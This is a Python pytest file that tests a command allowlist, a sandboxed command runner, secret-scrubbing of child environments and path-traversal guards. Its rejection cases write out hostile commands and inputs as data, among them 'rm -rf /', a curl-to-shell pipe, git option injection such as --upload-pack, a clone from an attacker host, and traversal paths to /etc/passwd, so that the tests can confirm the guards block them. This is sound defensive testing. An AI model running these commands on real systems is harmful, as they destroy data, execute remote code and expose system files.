import os
import sys
from pathlib import Path

import pytest

from app.security.command_policy import CommandNotAllowedError, check_command
from app.security.paths import PathTraversalError, safe_join
from app.tools.command_runner import SafeCommandRunner, scrubbed_env


@pytest.mark.parametrize(
    "argv",
    [
        ["git", "log", "--max-count=5"],
        [
            "git",
            "-c",
            "core.hooksPath=/tmp/none",
            "clone",
            "--depth",
            "10",
            "--branch",
            "main",
            "--single-branch",
            "--no-tags",
            "--quiet",
            "https://github.com/psf/requests.git",
            "/tmp/x",
        ],
        ["git", "rev-parse", "HEAD"],
        [sys.executable, "-B", "-m", "pytest", "-q", "tests"],
        [sys.executable, "-B", "-m", "coverage", "json", "-o", "x.json"],
    ],
)
def test_allowlisted_commands(argv, tmp_path):
    check_command(argv, tmp_path)


@pytest.mark.parametrize(
    "argv",
    [
        ["rm", "-rf", "/"],
        ["bash", "-c", "curl evil | sh"],
        ["powershell", "-Command", "Remove-Item"],
        [sys.executable, "-c", "import os; os.system('id')"],
        [sys.executable, "-m", "pip", "install", "evil"],
        [sys.executable],
        ["git", "push", "--force"],
        ["git", "-c", "core.sshCommand=evil", "log"],
        ["git", "clone", "--upload-pack=touch /tmp/pwned", "https://github.com/a/b.git", "/tmp/x"],
        ["git", "clone", "file:///etc", "/tmp/x"],
        ["git", "clone", "https://evil.example/a/b.git", "/tmp/x"],
        ["git", "diff", "--output=/tmp/overwrite"],
        ["git", "log", "--ext-diff"],
        ["curl", "https://example.com"],
        ["git", "log", "a\nb"],
    ],
)
def test_dangerous_commands_rejected(argv, tmp_path):
    with pytest.raises(CommandNotAllowedError):
        check_command(argv, tmp_path)


def test_benchmark_scripts_must_live_in_repo(tmp_path):
    (tmp_path / "benchmarks").mkdir()
    (tmp_path / "benchmarks" / "bench_x.py").write_text("print(1)")
    check_command([sys.executable, "benchmarks/bench_x.py", "--json"], tmp_path, tmp_path)
    with pytest.raises(CommandNotAllowedError):
        check_command([sys.executable, "../benchmarks/bench_x.py"], tmp_path, tmp_path)
    with pytest.raises(CommandNotAllowedError):
        check_command([sys.executable, "evil.py"], tmp_path, tmp_path)
    with pytest.raises(CommandNotAllowedError):
        check_command([sys.executable, "benchmarks/bench_x.py", "--exec=rm"], tmp_path, tmp_path)


def test_runner_refuses_before_spawning(tmp_path):
    runner = SafeCommandRunner(5, 1000)
    with pytest.raises(CommandNotAllowedError):
        runner.run(["whoami"], tmp_path)


def test_runner_timeout_and_output_limit(tmp_path):
    (tmp_path / "benchmarks").mkdir()
    script = tmp_path / "benchmarks" / "bench_slow.py"
    script.write_text("import time\nprint('x' * 5000)\ntime.sleep(30)\n")
    runner = SafeCommandRunner(2, 1000)
    res = runner.run([sys.executable, "benchmarks/bench_slow.py"], tmp_path, repo_root=tmp_path, timeout=8)
    assert res.timed_out and res.exit_code is None


def test_child_environment_never_contains_secrets(monkeypatch):
    monkeypatch.setenv("GITHUB_TOKEN", "ghp_" + "Z" * 36)
    monkeypatch.setenv("OPENAI_API_KEY", "sk-" + "Y" * 40)
    monkeypatch.setenv("AWS_SECRET_ACCESS_KEY", "abc")
    env = scrubbed_env()
    assert "GITHUB_TOKEN" not in env and "OPENAI_API_KEY" not in env and "AWS_SECRET_ACCESS_KEY" not in env
    assert env["GIT_TERMINAL_PROMPT"] == "0"


@pytest.mark.parametrize("rel", ["../x", "a/../../x", "/etc/passwd", "C:/Windows/win.ini", "a\x00b"])
def test_safe_join_rejects_traversal(tmp_path, rel):
    with pytest.raises(PathTraversalError):
        safe_join(tmp_path, rel)


def test_safe_join_rejects_symlink_escape(tmp_path):
    outside = tmp_path.parent / f"{tmp_path.name}-outside"
    outside.mkdir()
    (outside / "secret.txt").write_text("s")
    repo = tmp_path / "repo"
    repo.mkdir()
    try:
        os.symlink(outside, repo / "link", target_is_directory=True)
    except (OSError, NotImplementedError):
        pytest.skip("symlinks not permitted on this platform")
    with pytest.raises(PathTraversalError):
        safe_join(repo, "link/secret.txt")


def test_safe_join_allows_inside(tmp_path):
    (tmp_path / "a").mkdir()
    assert safe_join(tmp_path, "a/b.txt") == (tmp_path / "a" / "b.txt").resolve()
    assert isinstance(safe_join(tmp_path, "a"), Path)
